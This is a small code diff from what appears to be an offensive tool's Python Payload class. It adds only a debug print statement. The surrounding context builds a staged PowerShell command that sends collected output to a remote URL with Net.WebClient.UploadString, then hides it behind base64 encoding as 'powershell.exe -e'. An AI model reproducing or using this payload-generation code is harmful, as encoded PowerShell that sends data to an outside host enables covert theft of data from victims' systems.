@@ -28,6 +28,7 @@ class Payload:
         stage3 = '(New-Object Net.WebClient).UploadString("%s/ressources/%s", $Out)' % (url, self.filename)
 
         payload = ';'.join([stage1, stage2, stage3])
+        print(payload)
 
         return "powershell.exe -e %s" % powershell_encode_base64(payload)
 
